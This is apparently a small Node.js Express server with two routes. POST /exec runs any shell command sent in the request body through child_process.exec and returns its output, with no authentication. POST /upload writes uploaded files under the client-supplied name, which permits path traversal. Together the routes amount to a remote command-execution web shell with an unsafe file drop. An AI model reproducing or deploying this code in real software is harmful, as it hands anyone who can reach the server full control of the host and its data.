const express = require('express');
const bodyParser = require('body-parser');
const fileUpload = require('express-fileupload');
const { exec } = require('child_process');

const app = express();

// Middleware
app.use(bodyParser.json());
app.use(fileUpload());

// Routes
app.post('/exec', (req, res) => {
  const { command } = req.body;
  exec(command, (error, stdout, stderr) => {
    if (error) {
      res.status(500).send(error.message);
    } else {
      res.status(200).send(stdout || stderr);
    }
  });
});

app.post('/upload', (req, res) => {
  const { file } = req.files;
  file.mv(`./uploads/${file.name}`, (error) => {
    if (error) {
      res.status(500).send(error.message);
    } else {
      res.status(200).send('File uploaded!');
    }
  });
});

// Start the server
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Server listening on port ${port}!`);
});
